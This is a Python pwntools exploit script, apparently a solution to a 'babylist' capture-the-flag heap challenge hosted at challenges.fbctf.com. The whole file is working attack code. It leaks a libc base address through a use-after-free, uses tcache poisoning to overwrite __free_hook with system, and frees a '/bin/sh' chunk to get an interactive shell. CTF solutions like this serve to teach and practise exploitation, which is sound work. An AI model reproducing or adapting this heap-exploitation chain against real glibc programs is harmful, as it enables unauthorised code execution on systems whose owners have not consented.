from pwn import *
def cmd(n):
	p.sendlineafter("> ",str(n))
def add(name):
	cmd(1)
	p.sendlineafter("list:\n",str(name))
def num(idx,n):
	cmd(2)
	p.sendlineafter("list:\n",str(idx))
	p.sendlineafter("add:\n",str(n))
def show(idx,index):
	cmd(3)
	p.sendlineafter("list:\n",str(idx))
	p.sendlineafter("list:\n",str(index))
def cp(idx,name):
	cmd(4)
	p.sendlineafter("list:\n",str(idx))
	p.sendlineafter("list:\n",str(name))
def free(idx):
	cmd(5)
	p.sendlineafter("list:\n",str(idx))
def cal(n):
	if n>0:
		return n
	if n<0:
		return 0x100000000+n
def recal(p1):
	if p1 >= 0x80000000:
		p1=p1-0x100000000
	return p1
#context.log_level='debug'
libc=ELF("./libc-2.27.so")
#p=process('./babylist')
p=remote("challenges.fbctf.com",1343)
add("Origin")
for x in range(0x40):
	num(0,1)
for x in range(8):
	cp(0,str(x))

for x in range(0,8):
	num(x,1)
show(8,0)
p.readuntil("= ")
p1=cal(int(p.readline()[:-1],10))
show(8,1)
p.readuntil("= ")
p2=cal(int(p.readline()[:-1],10))
p2=p2<<32
base=p2+p1-(0x7ffff782eca0-0x7ffff7443000)
log.warning(hex(base))
libc.address=base
for x in range(0,8):
	free(x)
add("0")#0
sh=0x68732f6e69622f
num(0,(sh&0xffffffff))
num(0,(sh>>32))
for x in range(0x20-2):
	num(0,"1")
cp(0,"1")#1
cp(0,"2")#2
cp(0,"3")#3
num(0,"1")
num(1,"1")
add(p64(libc.sym['__free_hook']))
add("/bin/sh")
add(p64(libc.sym['system']))
num(3,0)
p.interactive()
